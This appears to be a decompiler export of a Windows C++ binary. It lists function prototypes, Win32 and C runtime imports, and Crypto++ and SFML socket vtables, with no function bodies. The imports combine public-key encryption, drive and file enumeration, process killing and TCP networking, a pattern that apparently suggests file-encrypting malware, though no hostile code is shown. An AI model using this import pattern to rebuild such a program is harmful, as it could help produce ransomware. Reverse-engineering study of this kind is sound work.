// int __cdecl __stdio_common_vsprintf_s(unsigned __int64 Options, char *Buffer, size_t BufferCount, const char *Format, _locale_t Locale, va_list ArgList);
// int __cdecl fgetc(FILE *Stream);
// _DWORD __stdcall unknown_libname_58(_DWORD); weak
int __cdecl sub_48EF19(int a1);
// void __cdecl _invalid_parameter_noinfo();
// void __cdecl __noreturn _invalid_parameter_noinfo_noreturn();
// void __cdecl __noreturn _invoke_watson(const wchar_t *Expression, const wchar_t *FunctionName, const wchar_t *FileName, unsigned int LineNo, uintptr_t Reserved);
intptr_t __cdecl sub_48F008(char *a1);
intptr_t __cdecl sub_48F108(char *a1);
int __cdecl sub_48F113(_DWORD *a1);
// int __cdecl _setmode(int FileHandle, int Mode);
// wint_t __cdecl fgetwc(FILE *Stream);
// struct lconv *__cdecl localeconv();
// int __cdecl _fileno(FILE *Stream);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_48F5E2(int a1, int a2);
// size_t __cdecl fwrite(const void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// unsigned int *__cdecl __doserrno();
// int *__cdecl _errno();
// int __cdecl _wrename(const wchar_t *OldFileName, const wchar_t *NewFileName);
// FILE *__cdecl _fsopen(const char *FileName, const char *Mode, int ShFlag);
// FILE *__cdecl _wfopen(const wchar_t *FileName, const wchar_t *Mode);
// FILE *__cdecl _wfsopen(const wchar_t *FileName, const wchar_t *Mode, int ShFlag);
// int __cdecl fgetpos(FILE *Stream, fpos_t *Position);
// _DWORD __stdcall __crt_seh_guarded_call<unsigned int>::operator()<_lambda_11b4f7b0d3157825a5656a18eba1ae27_,_lambda_b51c0495177f500e782686251704ae76_ &,_lambda_cf89b47920b5017557bfe891e78aca36_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_48FB35(int a1, int a2);
// int __cdecl setvbuf(FILE *Stream, char *Buffer, int Mode, size_t Size);
void __cdecl j___free_base(void *Block);
// int __cdecl ungetc(int Character, FILE *Stream);
// double __cdecl frexp(double X, int *Y);
// int __cdecl fsetpos(FILE *Stream, const fpos_t *Position);
// size_t __cdecl fread(void *Buffer, size_t ElementSize, size_t ElementCount, FILE *Stream);
// int __cdecl _fseeki64(FILE *Stream, __int64 Offset, int Origin);
// int __cdecl fseek(FILE *Stream, int Offset, int Origin);
// double __cdecl ldexp(double X, int Y);
double __cdecl sub_4908CE(int a1, _DWORD *a2, struct __crt_locale_pointers *a3);
double __cdecl sub_49095F(int a1, _DWORD *a2, struct __crt_locale_pointers *a3);
// _DWORD __cdecl unknown_libname_59(_DWORD, _DWORD, _DWORD); weak
// _DWORD __cdecl unknown_libname_75(_DWORD, _DWORD, _DWORD, _DWORD); weak
int __cdecl sub_490B07(__crt_locale_pointers *a1, int a2, _DWORD *a3, int a4);
// _DWORD __cdecl __crt_strtox::parse_floating_point_from_source<__crt_strtox::c_string_character_source<char>>(_locale_t Locale, _DWORD, _DWORD); weak
// _DWORD __cdecl __crt_strtox::parse_floating_point_write_result<double>(_DWORD, _DWORD, _DWORD); weak
void __cdecl sub_493D86(int, _DWORD *);
void __cdecl sub_493D9D(int, _DWORD *);
// int __cdecl isdigit(int C);
// int __cdecl tolower(int C);
// __m128 _libm_sse2_pow_precise(void); weak
// int __cdecl strncmp(const char *Str1, const char *Str2, size_t MaxCount);
// void *__cdecl malloc(size_t Size);
int __cdecl sub_494CF2(int a1, int a2);
// _DWORD __cdecl unknown_libname_62(_DWORD, _DWORD, _DWORD); weak
// errno_t __cdecl wcstombs_s(size_t *PtNumOfCharConverted, char *Dst, size_t DstSizeInBytes, const wchar_t *Src, size_t MaxCountInBytes);
// __time64_t __cdecl _time64(__time64_t *Time);
int __cdecl sub_4960BD(int a1);
int sub_496C23();
// int common_initialize_environment_nolock<char>(void); weak
// _DWORD __cdecl unknown_libname_63(void *Block); weak
// int initialize_environment_by_cloning_nolock<char>(void); weak
void *__cdecl sub_496E6A(void **a1);
void *__cdecl sub_496E85(void **a1);
// int __dcrt_uninitialize_environments_nolock(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<char *>::operator()<_lambda_0fef6fff2b5e6b53303c9058db11ae1f_,_lambda_082c17da81b0962e08c0587ee0fac50c_ &,_lambda_fa6e051aed0a38726081083cc7c328e9_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_496F97(int a1, int a2);
int __cdecl sub_496FBF(int a1, int a2);
int __cdecl sub_497248(_onexit_t Function);
// int __cdecl _register_onexit_function(_onexit_table_t *Table, _onexit_t Function);
char sub_4972DC();
char sub_497308();
__vcrt_bool sub_49734D();
int sub_4973F1();
int __cdecl sub_4973F7(int a1);
int __cdecl sub_49741F(int a1);
int *sub_49754B();
void **sub_497551();
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4975D5(int a1, int a2);
void __thiscall sub_4975FD(_DWORD *this);
__int32 sub_4977BD();
int sub_4986CC();
// int __cdecl _set_new_mode(int NewMode);
int *sub_498701();
// _DWORD __cdecl __crt_strtox::parse_integer<unsigned long,__crt_strtox::c_string_character_source<char>>(_DWORD, _DWORD, _DWORD, _DWORD, char); weak
int __cdecl sub_499B06(int a1);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_9227be29367c048ad7fd93a717dcb1a1_,_lambda_a463b7b0560cfcaf9b17f27c6ef46564_ &,_lambda_ccea11b5727ccf69be64f5f5d9a08d9f_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_499C34(int a1, int a2);
// _DWORD __stdcall __crt_seh_guarded_call<void (__cdecl *)(int)>::operator()<_lambda_a048d3beccc847880fc8490e18b82769_,_lambda_ec61778202f4f5fc7e7711acc23c3bca_ &,_lambda_f7496a158712204296dd6628a163878e_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_49A58C(int a1, int a2);
// void *__cdecl _calloc_base(size_t Count, size_t Size);
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_3518db117f0e7cdb002338c5d3c47b6c_,_lambda_b2ea41f6bbb362cd97d94c6828d90b61_ &,_lambda_abdedf541bb04549bc734292b4a045d4_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_51b6e8b1eb166f2a3faf91f424b38130_,_lambda_6250bd4b2a391816dd638c3bf72b0bcb_ &,_lambda_0b5a4a3e68152e1d9b943535f5f47bed_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_5b71d36f03204c0beab531769a5b5694_,_lambda_be2b3da3f62db62e9dad5dc70221a656_ &,_lambda_8f9ce462984622f9bf76b59e2aaaf805_>(_DWORD, _DWORD, _DWORD); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_9df27f884b057bc3edfc946cb5b7cf47_,_lambda_e69574bed617af4e071282c136b37893_ &,_lambda_cc0d902bcbbeb830f749456577db4721_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_49AFEC(int a1, int a2);
int __cdecl sub_49B014(int a1, int a2);
int __cdecl sub_49B03C(int a1, int a2);
int __cdecl sub_49B064(int a1, int a2);
// void __cdecl _free_base(void *Block);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_61cee617f5178ae960314fd4d05640a0_,_lambda_6978c1fb23f02e42e1d9e99668cc68aa_ &,_lambda_9cd88cf8ad10232537feb2133f08c833_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_49B519(int a1, int a2);
// _DWORD __stdcall __crt_seh_guarded_call<int>::operator()<_lambda_123407a5e2ac06da108355a851863b7a_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_ae55bdf541ad94d75914d381c370e64d_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_49BEB9(int a1, int a2);
int __cdecl sub_49BEE1(int a1);
int __cdecl sub_49C54A(int a1, int *a2);
void *__cdecl sub_49C577(int a1, void **a2);
// errno_t __cdecl _dupenv_s(char **Buffer, size_t *BufferCount, const char *VarName);
// _DWORD __stdcall __crt_seh_guarded_call<bool>::operator()<_lambda_eee62cb4a147bfbb98180ad682ce6e17_,_lambda_5056f36f92c185fae794536d1ce2027b_ &,_lambda_57c77e0e75d6a1e6f8ecaa6bd26c2518_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_49D5EE(int a1, int a2);
// intptr_t __cdecl _spawnve(int Mode, const char *FileName, const char *const *Arguments, const char *const *Environment);
// intptr_t __cdecl _spawnvpe(int Mode, const char *FileName, const char *const *Arguments, const char *const *Environment);
// errno_t __cdecl _access_s(const char *FileName, int AccessMode);
// size_t __cdecl _msize(void *Block);
// void *__cdecl _realloc_base(void *Block, size_t Size);
int sub_4A09D3();
int __thiscall sub_4A2224(_DWORD **this, void *Block);
// int unknown_libname_72(void); weak
// _DWORD __stdcall __crt_seh_guarded_call<void>::operator()<_lambda_c76fdea48760d5f9368b465f31df4405_,_lambda_e378711a6f6581bf7f0efd7cdf97f5d9_ &,_lambda_e927a58b2a85c081d733e8c6192ae2d2_>(_DWORD, _DWORD, _DWORD); weak
int __cdecl sub_4A232E(int a1, int a2);
// int __acrt_update_thread_multibyte_data(void); weak
char *__cdecl sub_4A2EEC(void *Block, unsigned int a2, unsigned int a3);
char sub_4A2F75();
// int __acrt_update_thread_locale_data(void); weak
int __cdecl sub_4AA224(double a1);
// _DWORD __cdecl _ceil_default(double); weak
// BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature);
int __thiscall sub_4AA360(void *this);
void *sub_4AA628();
int __stdcall sub_4AA7FD(int a1);
// int __stdcall __ExceptionPtr::_PlacementInitBadAllocException(void *, void *, void **); weak
// void __cdecl __ExceptionPtrCopy(void *, const void *); weak
// void __cdecl __ExceptionPtrCreate(void *); weak
// void __cdecl __ExceptionPtrCurrentException(void *); weak
// void __cdecl __ExceptionPtrDestroy(void *); weak
void __cdecl sub_4B75B0(); // idb
void __cdecl sub_4B7600(); // idb
// int __stdcall WSACleanup();
void __cdecl sub_4B7670(); // idb
void __cdecl sub_4B76D0(); // idb
void __cdecl nullsub_2(); // idb
void __cdecl sub_4B7740(); // idb
void __cdecl nullsub_3(); // idb
void __cdecl sub_4B7760(); // idb
void __cdecl sub_4B77F0(); // idb
void __cdecl sub_4B7880(); // idb
void __cdecl sub_4B7910(); // idb
void __cdecl sub_4B7930(); // idb
void __cdecl sub_4B7970(); // idb
void __cdecl sub_4B79E0(); // idb
void __cdecl sub_4B7A50(); // idb
void __cdecl sub_4B7AF0(); // idb
void __cdecl sub_4B7B00(); // idb
void __cdecl sub_4B7B70(); // idb
void __cdecl sub_4B7B90(); // idb
void __cdecl sub_4B7BA0(); // idb
void __cdecl sub_4B7C12(); // idb
void __cdecl sub_4B7C1C(); // idb
void __cdecl sub_4B7C26(); // idb
void __cdecl sub_4B7C30(); // idb
void __cdecl sub_4B7C3A(); // idb
void __cdecl sub_4B7C44(); // idb
void __cdecl sub_4B7C4E(); // idb
void __cdecl sub_4B7C58(); // idb
void __cdecl sub_4B7C62(); // idb
void __cdecl sub_4B7C6C(); // idb
void __cdecl sub_4B7C76(); // idb
void __cdecl sub_4B7C80(); // idb
void __cdecl sub_4B7C8A(); // idb
void __cdecl sub_4B7C94(); // idb
void __cdecl sub_4B7C9E(); // idb

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_4AB4E2; // weak
_UNKNOWN loc_4ABA89; // weak
_UNKNOWN loc_4ABBD8; // weak
_UNKNOWN loc_4ABC08; // weak
_UNKNOWN loc_4AC175; // weak
_UNKNOWN loc_4ACA66; // weak
_UNKNOWN loc_4AD0E1; // weak
_UNKNOWN loc_4AD84D; // weak
_UNKNOWN loc_4AEEAB; // weak
_UNKNOWN loc_4AFD69; // weak
_UNKNOWN loc_4B0998; // weak
_UNKNOWN loc_4B12F0; // weak
_UNKNOWN loc_4B1378; // weak
_UNKNOWN loc_4B1760; // weak
_UNKNOWN loc_4B2F9B; // weak
_UNKNOWN loc_4B40AE; // weak
_UNKNOWN loc_4B5C4E; // weak
// extern BOOL (__stdcall *CryptReleaseContext)(HCRYPTPROV hProv, DWORD dwFlags);
// extern BOOL (__stdcall *CryptAcquireContextA)(HCRYPTPROV *phProv, LPCSTR szContainer, LPCSTR szProvider, DWORD dwProvType, DWORD dwFlags);
// extern BOOL (__stdcall *CryptGenRandom)(HCRYPTPROV hProv, DWORD dwLen, BYTE *pbBuffer);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern HANDLE (__stdcall *CreateToolhelp32Snapshot)(DWORD dwFlags, DWORD th32ProcessID);
// extern BOOL (__stdcall *Process32Next)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern DWORD (__stdcall *GetLastError)();
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern BOOL (__stdcall *QueryPerformanceCounter)(LARGE_INTEGER *lpPerformanceCount);
// extern BOOL (__stdcall *QueryPerformanceFrequency)(LARGE_INTEGER *lpFrequency);
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern BOOL (__stdcall *GetThreadTimes)(HANDLE hThread, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime);
// extern BOOL (__stdcall *Process32First)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FreeConsole)();
// extern DWORD (__stdcall *GetLogicalDrives)();
// extern HMODULE (__stdcall *GetModuleHandleW)(LPCWSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern DWORD (__stdcall *GetCurrentThreadId)();
// extern BOOL (__stdcall *DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// extern DWORD (__stdcall *WaitForSingleObjectEx)(HANDLE hHandle, DWORD dwMilliseconds, BOOL bAlertable);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern DWORD (__stdcall *TlsAlloc)();
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern BOOL (__stdcall *TlsFree)(DWORD dwTlsIndex);
// extern PVOID (__stdcall *EncodePointer)(PVOID Ptr);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern void (__stdcall *InitializeSListHead)(PSLIST_HEADER ListHead);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern HANDLE (__stdcall *CreateTimerQueue)();
// extern DWORD (__stdcall *SignalObjectAndWait)(HANDLE hObjectToSignal, HANDLE hObjectToWaitOn, DWORD dwMilliseconds, BOOL bAlertable);
// extern BOOL (__stdcall *SetThreadPriority)(HANDLE hThread, int nPriority);
// extern int (__stdcall *GetThreadPriority)(HANDLE hThread);
// extern BOOL (__stdcall *GetLogicalProcessorInformation)(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION Buffer, PDWORD ReturnedLength);
// extern BOOL (__stdcall *CreateTimerQueueTimer)(PHANDLE phNewTimer, HANDLE TimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags);
// extern BOOL (__stdcall *ChangeTimerQueueTimer)(HANDLE TimerQueue, HANDLE Timer, ULONG DueTime, ULONG Period);
// extern BOOL (__stdcall *DeleteTimerQueueTimer)(HANDLE TimerQueue, HANDLE Timer, HANDLE CompletionEvent);
// extern BOOL (__stdcall *GetNumaHighestNodeNumber)(PULONG HighestNodeNumber);
// extern BOOL (__stdcall *GetProcessAffinityMask)(HANDLE hProcess, PDWORD_PTR lpProcessAffinityMask, PDWORD_PTR lpSystemAffinityMask);
// extern DWORD_PTR (__stdcall *SetThreadAffinityMask)(HANDLE hThread, DWORD_PTR dwThreadAffinityMask);
// extern BOOL (__stdcall *RegisterWaitForSingleObject)(PHANDLE phNewWaitObject, HANDLE hObject, WAITORTIMERCALLBACK Callback, PVOID Context, ULONG dwMilliseconds, ULONG dwFlags);
// extern BOOL (__stdcall *UnregisterWait)(HANDLE WaitHandle);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern void (__stdcall __noreturn *FreeLibraryAndExitThread)(HMODULE hLibModule, DWORD dwExitCode);
// extern DWORD (__stdcall *GetModuleFileNameW)(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HMODULE (__stdcall *LoadLibraryExW)(LPCWSTR lpLibFileName, HANDLE hFile, DWORD dwFlags);
// extern BOOL (__stdcall *GetVersionExW)(LPOSVERSIONINFOW lpVersionInformation);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern BOOL (__stdcall *VirtualProtect)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *ReleaseSemaphore)(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// extern PSLIST_ENTRY (__stdcall *InterlockedPopEntrySList)(PSLIST_HEADER ListHead);
// extern PSLIST_ENTRY (__stdcall *InterlockedPushEntrySList)(PSLIST_HEADER ListHead, PSLIST_ENTRY ListEntry);
// extern PSLIST_ENTRY (__stdcall *InterlockedFlushSList)(PSLIST_HEADER ListHead);
// extern USHORT (__stdcall *QueryDepthSList)(PSLIST_HEADER ListHead);
// extern BOOL (__stdcall *UnregisterWaitEx)(HANDLE WaitHandle, HANDLE CompletionEvent);
// extern HMODULE (__stdcall *LoadLibraryW)(LPCWSTR lpLibFileName);
// extern int (__stdcall *select)(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, const struct timeval *timeout);
// extern int (__stdcall *recv)(SOCKET s, char *buf, int len, int flags);
// extern int (__stdcall *getpeername)(SOCKET s, struct sockaddr *name, int *namelen);
// extern int (__stdcall *WSAGetLastError)();
// extern int (__stdcall *WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
// extern u_short (__stdcall *htons)(u_short hostshort);
// extern int (__stdcall *ioctlsocket)(SOCKET s, int cmd, u_long *argp);
// extern int (__stdcall *send)(SOCKET s, const char *buf, int len, int flags);
// extern void (__stdcall *freeaddrinfo)(PADDRINFOA pAddrInfo);
// extern INT (__stdcall *getaddrinfo)(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA *pHints, PADDRINFOA *ppResult);
// extern u_long (__stdcall *ntohl)(u_long netlong);
// extern char *(__stdcall *inet_ntoa)(struct in_addr in);
// extern unsigned int (__stdcall *inet_addr)(const char *cp);
// extern u_long (__stdcall *htonl)(u_long hostlong);
// extern int (__stdcall *connect)(SOCKET s, const struct sockaddr *name, int namelen);
// extern SOCKET (__stdcall *socket)(int af, int type, int protocol);
// extern int (__stdcall *setsockopt)(SOCKET s, int level, int optname, const char *optval, int optlen);
// extern int (__stdcall *closesocket)(SOCKET s);
void *std::exception::`vftable' = &std::exception::`scalar deleting destructor'; // weak
void *sf::Socket::`vftable' = &sub_4285B0; // weak
void *std::runtime_error::`vftable' = &sub_401930; // weak
void *std::_System_error::`vftable' = &sub_402F00; // weak
void *std::system_error::`vftable' = &sub_4030B0; // weak
void *std::_Generic_error_category::`vftable' = &sub_403210; // weak
void *std::_Iostream_error_category::`vftable' = &sub_403210; // weak
void *std::bad_cast::`vftable' = &sub_401930; // weak
void *std::_Facet_base::`vftable' = &sub_401D50; // weak
void *std::locale::facet::`vftable' = &sub_401E50; // weak
void *std::ctype_base::`vftable' = &sub_4024C0; // weak
void *std::ctype<char>::`vftable' = &sub_402690; // weak
void *std::ios_base::failure::`vftable' = &sub_403840; // weak
void *std::ios_base::`vftable' = &sub_403A90; // weak
void *std::ios::`vftable' = &sub_41D1B0; // weak
void *std::ostream::`vftable' = &sub_42833B; // weak
void *std::streambuf::`vftable' = &sub_41D130; // weak
void *std::stringbuf::`vftable' = &sub_42B0B0; // weak
void *std::ostringstream::`vftable' = &loc_42B041; // weak
_DWORD dword_4B8608[2] = { 0, 80 }; // weak
_UNKNOWN unk_4B8610; // weak
void *std::istream::`vftable' = &sub_428433; // weak
void *std::istringstream::`vftable' = &sub_42B039; // weak
_UNKNOWN unk_4B864C; // weak
void *std::num_put<char,std::ostreambuf_iterator<char>>::`vftable' = &sub_42B0E0; // weak
void *std::numpunct<char>::`vftable' = &sub_42B110; // weak
void *std::num_get<char,std::istreambuf_iterator<char>>::`vftable' = &sub_42B0E0; // weak
char a0123456789Ee[15] = "0123456789-+Ee"; // weak
_UNKNOWN unk_4B87EB; // weak
char a0123456789abcd_0[27] = "0123456789ABCDEFabcdef-+Xx"; // weak
_UNKNOWN unk_4B8807; // weak
char a0123456789abcd[29] = "0123456789ABCDEFabcdef-+XxPp"; // weak
_UNKNOWN unk_4B8825; // weak
void *sf::TcpSocket::`vftable' = &sub_432310; // weak
void *CryptoPP::Exception::`vftable' = &sub_405200; // weak
void *CryptoPP::InvalidArgument::`vftable' = &sub_4052B0; // weak
void *CryptoPP::NotImplemented::`vftable' = &sub_4052B0; // weak
void *CryptoPP::BERDecodeErr::`vftable' = &sub_432D90; // weak
void *CryptoPP::InputRejecting<CryptoPP::BufferedTransformation>::InputRejected::`vftable' = &sub_406420; // weak
void *CryptoPP::ByteQueue::Walker::`vftable' = &sub_432DF0; // weak
void *CryptoPP::ByteQueue::Walker::`vftable' = &sub_432D85; // weak
void *CryptoPP::OID::`vftable' = &sub_408AA0; // weak
void *CryptoPP::BERGeneralDecoder::`vftable' = &sub_432DB0; // weak
void *CryptoPP::BERGeneralDecoder::`vftable' = &sub_432D75; // weak
void *CryptoPP::DERGeneralEncoder::`vftable' = &sub_432DD0; // weak
void *CryptoPP::DERGeneralEncoder::`vftable' = &sub_432D7D; // weak
void *CryptoPP::BERSequenceDecoder::`vftable' = &sub_432DB0; // weak
void *CryptoPP::BERSequenceDecoder::`vftable' = &sub_432D75; // weak
void *CryptoPP::DERSequenceEncoder::`vftable' = &sub_432DD0; // weak
void *CryptoPP::DERSequenceEncoder::`vftable' = &sub_432D7D; // weak
void *CryptoPP::PK_SignatureScheme::InvalidKeyLength::`vftable' = &sub_432D90; // weak
void *CryptoPP::PK_SignatureScheme::KeyTooShort::`vftable' = &sub_432D90; // weak
void *CryptoPP::FilterPutSpaceHelper::`vftable' = &sub_406BA0; // weak
void *CryptoPP::HashFilter::`vftable' = &sub_434A50; // weak
void *CryptoPP::HashFilter::`vftable' = &sub_434A09; // weak
void *CryptoPP::HashFilter::`vftable' = &sub_434A11; // weak
void *CryptoPP::ArraySink::`vftable' = &sub_434A20; // weak
void *CryptoPP::ArraySink::`vftable' = &sub_434A01; // weak
void *CryptoPP::ArrayXorSink::`vftable' = &sub_434A20; // weak
void *CryptoPP::ArrayXorSink::`vftable' = &sub_434A01; // weak
_UNKNOWN unk_4B91C8; // weak
void *CryptoPP::NameValuePairs::`vftable' = &sub_405A50; // weak
void *CryptoPP::InvalidDataFormat::`vftable' = &sub_4052B0; // weak
void *CryptoPP::InvalidCiphertext::`vftable' = &sub_432D90; // weak
void *CryptoPP::CannotFlush::`vftable' = &sub_4052B0; // weak
void *CryptoPP::NameValuePairs::ValueTypeMismatch::`vftable' = &sub_405A80; // weak
void *CryptoPP::BufferedTransformation::NoChannelSupport::`vftable' = &sub_432D90; // weak
void *CryptoPP::InvalidKeyLength::`vftable' = &sub_432D90; // weak
void *CryptoPP::AlgorithmParametersBase::ParameterNotUsed::`vftable' = &sub_4052B0; // weak
void *CryptoPP::AlgorithmParametersBase::`vftable' = &sub_406A10; // weak
void *CryptoPP::AlgorithmParametersTemplate<int>::`vftable' = &sub_41D480; // weak
void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::ConstByteArrayParameter>::`vftable' = &sub_41D3E0; // weak
void *CryptoPP::SelfTestFailure::`vftable' = &sub_432D90; // weak
_UNKNOWN unk_4B93C8; // weak
void *CryptoPP::ClassNullRNG::`vftable' = &sub_436660; // weak
void *CryptoPP::PK_DefaultEncryptionFilter::`vftable' = &sub_436710; // weak
void *CryptoPP::PK_DefaultEncryptionFilter::`vftable' = &loc_43662B; // weak
void *CryptoPP::PK_DefaultDecryptionFilter::`vftable' = &sub_436680; // weak
void *CryptoPP::PK_DefaultDecryptionFilter::`vftable' = &loc_436623; // weak
_UNKNOWN unk_4B9900; // weak
void *CryptoPP::CombinedNameValuePairs::`vftable' = &sub_4391A0; // weak
void *CryptoPP::AlgorithmParametersTemplate<unsigned char const *>::`vftable' = &sub_439180; // weak
void *CryptoPP::AlgorithmParametersTemplate<unsigned char>::`vftable' = &sub_439180; // weak
void *CryptoPP::AlgorithmParametersTemplate<int const *>::`vftable' = &sub_41D480; // weak
void *CryptoPP::CryptoMaterial::InvalidMaterial::`vftable' = &sub_406420; // weak
void *CryptoPP::AlgorithmParametersTemplate<bool>::`vftable' = &sub_41D480; // weak
int (__stdcall *off_4BA264)(int) = &sub_41C7A0; // weak
void *off_4BA2B8 = &loc_428483; // weak
void *off_4BA2FC = &loc_42840B; // weak
void *off_4BA334 = &loc_42832B; // weak
int (__stdcall *off_4BA368)(int) = &sub_41C720; // weak
void *off_4BA3BC = &loc_42849B; // weak
void *off_4BA400 = &loc_42842B; // weak
void *off_4BA438 = &loc_42836B; // weak
void *CryptoPP::AbstractRing<CryptoPP::Integer>::MultiplicativeGroupT::`vftable' = &sub_43A700; // weak
void *CryptoPP::ModularArithmetic::`vftable' = &sub_43A620; // weak
void *CryptoPP::MontgomeryRepresentation::`vftable' = &sub_43A640; // weak
void *CryptoPP::StringSinkTemplate<std::string>::`vftable' = &sub_41CA90; // weak
void *CryptoPP::StringSinkTemplate<std::string>::`vftable' = &sub_4284B3; // weak
void *CryptoPP::StringStore::`vftable' = &sub_4071A0; // weak
void *CryptoPP::StringStore::`vftable' = &sub_428413; // weak
void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable' = &sub_41C980; // weak
void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable' = &sub_42837B; // weak
void *CryptoPP::StringSource::`vftable' = &sub_4074E0; // weak
void *CryptoPP::StringSource::`vftable' = &sub_428463; // weak
void *CryptoPP::X509PublicKey::`vftable' = &sub_408B30; // weak
void *CryptoPP::X509PublicKey::`vftable' = &sub_428403; // weak
void *CryptoPP::PKCS8PrivateKey::`vftable' = &sub_408BD0; // weak
void *CryptoPP::PKCS8PrivateKey::`vftable' = &sub_4065C0; // weak
void *CryptoPP::PKCS8PrivateKey::`vftable' = &sub_428423; // weak
void *CryptoPP::P1363_MGF1::`vftable' = &sub_41D2A0; // weak
void *CryptoPP::SHA1::`vftable' = &sub_41D2C0; // weak
void *CryptoPP::SHA256::`vftable' = &sub_43A720; // weak
void *CryptoPP::ECPPoint::`vftable' = &sub_43A600; // weak
void *CryptoPP::EC2NPoint::`vftable' = &sub_43A560; // weak
void *CryptoPP::BaseN_Decoder::`vftable' = &sub_4082A0; // weak
void *CryptoPP::BaseN_Decoder::`vftable' = &sub_4283A3; // weak
void *CryptoPP::InputRejecting<CryptoPP::Filter>::InputRejected::`vftable' = &sub_406420; // weak
void *CryptoPP::PK_MessageAccumulatorImpl<CryptoPP::SHA1>::`vftable' = &sub_43A4F0; // weak
int (__stdcall *off_4BAC30)(int) = &sub_41CB60; // weak
void *off_4BAC70 = &loc_4283B3; // weak
void *CryptoPP::AlgorithmParametersTemplate<CryptoPP::Integer>::`vftable' = &sub_43A450; // weak
